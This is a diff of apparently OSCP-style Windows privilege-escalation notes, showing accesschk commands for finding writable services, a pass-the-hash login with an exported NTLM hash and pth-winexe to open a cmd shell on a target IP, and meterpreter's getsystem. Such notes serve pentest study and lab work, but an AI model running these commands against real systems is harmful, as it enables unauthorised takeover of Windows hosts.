@@ -13,7 +13,7 @@ accesschk.exe -qwcu "Authenticated Users" *
 accesschk.exe -qwcu "Users" *
 accesschk.exe -qwcu "Everyone" *
 if there isn't accesschk, upload it (/usr/share/windows-binary/)
-make sure to use "-accepteula" parameter
+make sure to use "/accepteula" parameter if uploaded
 
 Edit binary misconfigured service:
 Get service
@@ -55,3 +55,4 @@ root@kali:~# export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403
 root@kali:~# pth-winexe -U administrator% //10.11.01.76 cmd 
 
 If you have admin access on a Windows box but want to upgrade to NT Authority/SYSTEM access, simply obtain a meterpreter session and run the getsystem command.  
+
